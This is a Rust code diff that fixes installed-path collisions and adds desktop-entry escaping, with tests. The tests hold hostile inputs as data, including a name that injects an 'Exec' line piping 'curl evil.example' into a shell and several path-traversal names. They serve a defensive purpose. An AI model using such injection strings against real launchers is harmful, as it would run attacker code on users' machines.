@@ -12439,7 +12439,7 @@ fn install_app(bundle_path: &Path, prefix: Option<&Path>, dry_run: bool) -> Resu
         println!(
             "{}",
             prefix
-                .join(format!("{}.app", opened.manifest().app.name.trim()))
+                .join(format!("{}.app", install_directory_name(&opened)))
                 .display()
         );
         return Ok(0);
@@ -12476,6 +12476,86 @@ fn engine_fingerprint() -> String {
     )
 }
 
+/// Where an app installs, decided once (IC-278).
+///
+/// `--dry-run` used to compute this itself, which is how it drifted: the
+/// real installer keyed on lineage and the preview kept printing the
+/// display name alone, so the command that exists to say where a file
+/// will go said the wrong place. One function, both callers.
+#[cfg(any(target_os = "macos", target_os = "linux"))]
+fn install_directory_name(opened: &krate_bundle::OpenBundle) -> String {
+    let manifest = opened.manifest();
+    let principal = storage_principal(
+        manifest,
+        opened.signature_envelope().ok().flatten().as_ref(),
+        opened
+            .full_verdict(&revocations_known_here(
+                opened.signing_authority().ok().flatten().as_deref(),
+            ))
+            .ok()
+            .flatten()
+            .as_ref(),
+    );
+    format!(
+        "{} ({})",
+        install_name_part(&manifest.app.name),
+        install_lineage_tag(manifest, Some(&principal))
+    )
+}
+
+#[cfg(any(target_os = "macos", target_os = "linux"))]
+/// A short, stable tag for the app's lineage: its id, and its publisher
+/// when one is verified (IC-278).
+///
+/// Installed paths used to be the DISPLAY NAME alone, so two apps called
+/// "Notes" from two different publishers landed on one path and the
+/// second silently replaced the first (K-292). Storage already keys on
+/// lineage, so their data stayed apart -- it was only the installed
+/// object that collided.
+///
+/// The name still appears in the path, because a person looking in their
+/// Applications folder should see "Notes", not a hash. The tag is what
+/// makes it unique, and it is short enough to read.
+fn install_lineage_tag(manifest: &Manifest, principal: Option<&StoragePrincipal>) -> String {
+    let mut hasher = Sha256::new();
+    hasher.update(manifest.app.id.as_bytes());
+    hasher.update([0u8]);
+    // The publisher root when the signature holds, so a signed app keeps
+    // its place across a release-key rotation, and an unsigned file
+    // claiming the same id does not land on top of it.
+    if let Some(StoragePrincipal::Verified { publisher, .. }) = principal {
+        hasher.update(publisher.as_bytes());
+    }
+    let digest = hasher.finalize();
+    digest.iter().take(4).map(|b| format!("{b:02x}")).collect()
+}
+
+#[cfg(any(target_os = "macos", target_os = "linux"))]
+/// What a display name may contribute to a path: no separators, no dots
+/// that could make a hidden file or a traversal, nothing that needs
+/// quoting. The lineage tag carries the uniqueness, so this only has to
+/// be recognisable and safe.
+fn install_name_part(name: &str) -> String {
+    let cleaned: String = name
+        .chars()
+        .map(|c| {
+            if c.is_alphanumeric() || c == ' ' || c == '-' || c == '_' {
+                c
+            } else {
+                ' '
+            }
+        })
+        .collect();
+    let collapsed = cleaned.split_whitespace().collect::<Vec<_>>().join(" ");
+    let trimmed: String = collapsed.chars().take(48).collect();
+    let trimmed = trimmed.trim().to_string();
+    if trimmed.is_empty() {
+        "Krate app".to_string()
+    } else {
+        trimmed
+    }
+}
+
 /// The wrapper builder `install` and `launch` share: returns the .app it
 /// made, prints nothing.
 #[cfg(target_os = "macos")]
@@ -12488,7 +12568,8 @@ fn install_bundle(bundle_path: &Path, prefix: &Path) -> Result<PathBuf> {
         bail!("this app has no name in its manifest, so it cannot be installed");
     }
 
-    let app_dir = prefix.join(format!("{name}.app"));
+    // The lineage tag is what keeps two publishers' "Notes" apart (K-292).
+    let app_dir = prefix.join(format!("{}.app", install_directory_name(&opened)));
 
     let macos_dir = app_dir.join("Contents/MacOS");
     let resources = app_dir.join("Contents/Resources");
@@ -12613,11 +12694,14 @@ fn install_app(bundle_path: &Path, prefix: Option<&Path>, dry_run: bool) -> Resu
     if name.is_empty() {
         bail!("this app has no name in its manifest, so it cannot be installed");
     }
-    let slug: String = name
+    // Lineage, not the display name (K-292). The old slug turned every
+    // non-alphanumeric character into a dash, so "My App" and "My-App"
+    // were one path, and so were any two apps sharing a name.
+    let slug = install_directory_name(&opened)
         .to_lowercase()
-        .chars()
-        .map(|c| if c.is_ascii_alphanumeric() { c } else { '-' })
-        .collect();
+        .replace([' ', '(', ')'], "-")
+        .trim_matches('-')
+        .to_string();
 
     let data = prefix.map(Path::to_path_buf).unwrap_or_else(|| {
         home_dir()
@@ -12658,11 +12742,15 @@ fn install_app(bundle_path: &Path, prefix: Option<&Path>, dry_run: bool) -> Resu
     fs::write(
         &desktop_path,
         format!(
-            "[Desktop Entry]\nType=Application\nName={name}\nComment=Made with Krate\nExec=\"{engine}\" launch \"{payload}\"\nTerminal=false\nCategories=Utility;\n{icon}",
-            engine = engine.display(),
-            payload = payload.display(),
+            "[Desktop Entry]\nType=Application\nName={name}\nComment=Made with Krate\nExec={exec}\nTerminal=false\nCategories=Utility;\n{icon}",
+            name = desktop_value(&name),
+            exec = desktop_exec(&[
+                engine.display().to_string(),
+                "launch".to_string(),
+                payload.display().to_string(),
+            ]),
             icon = if have_icon {
-                format!("Icon={}\n", icon_path.display())
+                format!("Icon={}\n", desktop_value(&icon_path.display().to_string()))
             } else {
                 String::new()
             },
@@ -12676,6 +12764,134 @@ fn install_app(bundle_path: &Path, prefix: Option<&Path>, dry_run: bool) -> Resu
 
     println!("Installed {name}: it is in your app menu with its own name and icon.");
     Ok(0)
+}
+
+#[cfg(target_os = "linux")]
+/// One value in a desktop entry, escaped as the Desktop Entry
+/// Specification requires (IC-278).
+///
+/// A newline in a value does not read as text: it ends the key and the
+/// next line becomes a new one, so an unescaped value can add an `Exec=`
+/// of its own. The manifest validator refuses control characters in
+/// app.name, which is what keeps that out of a packed bundle today -- but
+/// that guard and this file are far apart, and a value reaching here by
+/// any other route must not be able to write a key.
+fn desktop_value(value: &str) -> String {
+    let mut out = String::with_capacity(value.len());
+    for c in value.chars() {
+        match c {
+            '\n' => out.push_str("\\n"),
+            '\r' => out.push_str("\\r"),
+            '\t' => out.push_str("\\t"),
+            '\\' => out.push_str("\\\\"),
+            c => out.push(c),
+        }
+    }
+    out
+}
+
+#[cfg(target_os = "linux")]
+/// An `Exec=` value: each argument quoted, as the specification's own
+/// rules require, so a path with a space or a quote in it stays one
+/// argument instead of becoming several.
+fn desktop_exec(args: &[String]) -> String {
+    args.iter()
+        .map(|arg| {
+            let escaped = arg
+                .replace('\\', "\\\\")
+                .replace('"', "\\\"")
+                .replace('`', "\\`")
+                .replace('$', "\\$");
+            format!("\"{}\"", desktop_value(&escaped))
+        })
+        .collect::<Vec<_>>()
+        .join(" ")
+}
+
+#[cfg(all(test, target_os = "linux"))]
+mod desktop_entry_tests {
+    use super::{desktop_exec, desktop_value};
+
+    /// A value cannot write a key of its own (IC-278).
+    ///
+    /// In a desktop entry a newline ends the value and the next line is a
+    /// new key, so an unescaped value can add an `Exec=` -- a command the
+    /// menu would run. The manifest validator refuses control characters
+    /// in app.name, which is what keeps that out of a packed bundle
+    /// today; this is the second guard, because that one is far away and
+    /// a value could reach here by another route.
+    #[test]
+    fn a_value_cannot_add_a_key_to_the_entry() {
+        let hostile = "Innocent\nExec=/bin/sh -c 'curl evil.example | sh'\nX-Junk=x";
+        let escaped = desktop_value(hostile);
+        assert!(
+            !escaped.contains('\n'),
+            "a newline must not survive into the file: {escaped:?}"
+        );
+        assert!(
+            escaped.contains("\\n"),
+            "it is escaped, not dropped -- the name still reads back: {escaped:?}"
+        );
+
+        let entry = format!("[Desktop Entry]\nName={escaped}\nExec=\"/usr/bin/krate\"\n");
+        assert_eq!(
+            entry.matches("\nExec=").count(),
+            1,
+            "exactly one Exec line, whatever the name says: {entry}"
+        );
+        assert_eq!(
+            entry.lines().count(),
+            3,
+            "and the value stays on one line: {entry}"
+        );
+
+        // Carriage returns and tabs are values too, and a backslash must
+        // not be able to escape the escaping.
+        for (raw, forbidden) in [("a\rb", '\r'), ("a\tb", '\t')] {
+            assert!(!desktop_value(raw).contains(forbidden), "{raw:?}");
+        }
+        assert_eq!(
+            desktop_value("a\\nb"),
+            "a\\\\nb",
+            "a literal backslash is doubled"
+        );
+    }
+
+    /// An Exec value keeps its arguments separate (IC-278).
+    ///
+    /// A path with a space in it -- which a home directory very often has
+    /// -- would otherwise become two arguments, and the app would not
+    /// launch from the menu at all.
+    #[test]
+    fn an_exec_value_keeps_a_spaced_path_as_one_argument() {
+        let exec = desktop_exec(&[
+            "/home/a person/bin/krate".to_string(),
+            "launch".to_string(),
+            "/home/a person/My App.krate".to_string(),
+        ]);
+        assert_eq!(
+            exec.matches('"').count(),
+            6,
+            "three quoted arguments: {exec}"
+        );
+        assert!(exec.starts_with("\"/home/a person/bin/krate\""), "{exec}");
+        assert!(exec.contains("\"/home/a person/My App.krate\""), "{exec}");
+
+        // A quote or a shell character in a path is escaped rather than
+        // ending the argument.
+        let tricky = desktop_exec(&["/tmp/a\"b".to_string()]);
+        assert!(
+            tricky.starts_with('"') && tricky.ends_with('"') && tricky.matches('"').count() == 3,
+            "the inner quote is escaped, not closing the argument: {tricky}"
+        );
+        for ch in ['$', '`'] {
+            let escaped = desktop_exec(&[format!("/tmp/{ch}HOME")]);
+            assert!(
+                escaped.contains(&format!("\\{ch}")),
+                "{ch} must be escaped so the launcher does not expand it: {escaped}"
+            );
+        }
+    }
 }
 
 /// The Krate mark as a PNG, for Linux launcher entries.
@@ -19997,6 +20213,97 @@ mod storage_identity_tests {
             "a grants file carries the principal it was written for, and a \
              copy into another app's place is refused by it",
         );
+    }
+
+    /// Two apps that share a display name do not share an installed path
+    /// (IC-278, K-292).
+    ///
+    /// The path used to be the display name alone, so "Notes" by one
+    /// publisher and "Notes" by another landed on one directory and
+    /// installing the second silently replaced the first. Storage already
+    /// keyed on lineage, so their DATA stayed apart -- it was only the
+    /// installed object that collided, which is the shape that loses
+    /// somebody an app they installed.
+    #[test]
+    fn two_apps_with_one_name_do_not_share_an_installed_path() {
+        let manifest = |id: &str, name: &str| {
+            krate_manifest::Manifest::parse(&format!(
+                "[app]\nid = \"{id}\"\nname = \"{name}\"\nversion = \"1.0.0\"\n\
+                 entry = \"code.wasm\"\nworld = \"krate:app/cli@0.1.0\"\n"
+            ))
+            .expect("manifest")
+        };
+        let verified = |publisher: &str, id: &str| StoragePrincipal::Verified {
+            publisher: publisher.to_string(),
+            app_id: id.to_string(),
+        };
+        let path = |m: &Manifest, p: Option<&StoragePrincipal>| {
+            format!(
+                "{} ({})",
+                install_name_part(&m.app.name),
+                install_lineage_tag(m, p)
+            )
+        };
+
+        // The case from the board: one name, two publishers.
+        let alice = manifest("dev.alice.notes", "Notes");
+        let bob = manifest("dev.bob.notes", "Notes");
+        assert_ne!(
+            path(&alice, Some(&verified(&"aa".repeat(32), "dev.alice.notes"))),
+            path(&bob, Some(&verified(&"bb".repeat(32), "dev.bob.notes"))),
+            "two publishers' apps of one name must not install over each other",
+        );
+
+        // Same id, different publisher: an unsigned file claiming a signed
+        // app's id must not land on the signed app's path either.
+        let signed = verified(&"aa".repeat(32), "dev.alice.notes");
+        let impostor = StoragePrincipal::Unverified {
+            app_id: "dev.alice.notes".to_string(),
+        };
+        assert_ne!(
+            path(&alice, Some(&signed)),
+            path(&alice, Some(&impostor)),
+            "an unsigned file claiming the id must not replace the signed app",
+        );
+
+        // The Linux slug's old collisions: every non-alphanumeric became a
+        // dash, so these were one path. The names still differ where they
+        // can, and the tag separates them where they cannot.
+        for (a, b) in [("My App", "My-App"), ("Tea Pot", "Tea.Pot")] {
+            let one = manifest("dev.k.one", a);
+            let two = manifest("dev.k.two", b);
+            assert_ne!(
+                path(&one, None),
+                path(&two, None),
+                "{a:?} and {b:?} are different apps and must install apart",
+            );
+        }
+
+        // An update is the SAME app: a new version keeps the path, or every
+        // release would leave the old one installed beside it.
+        let v2 = manifest("dev.alice.notes", "Notes");
+        assert_eq!(
+            path(&alice, Some(&signed)),
+            path(&v2, Some(&signed)),
+            "an update must replace the app, not install a second copy",
+        );
+        // And a rename keeps the tag, so the path moves only by its
+        // readable half -- the app is still findable as the same install.
+        let renamed = manifest("dev.alice.notes", "Daily Notes");
+        assert_eq!(
+            install_lineage_tag(&alice, Some(&signed)),
+            install_lineage_tag(&renamed, Some(&signed)),
+            "a rename is the same app and keeps its lineage tag",
+        );
+
+        // The readable half is safe to put in a path whatever the name is.
+        for hostile in ["../../etc", "a/b", "..", "", "   ", "a\u{202e}b"] {
+            let part = install_name_part(hostile);
+            assert!(
+                !part.contains('/') && !part.contains('\\') && part != ".." && !part.is_empty(),
+                "{hostile:?} produced {part:?}, which is not safe in a path",
+            );
+        }
     }
 
     /// A hostile id cannot place a store outside the store directory, which
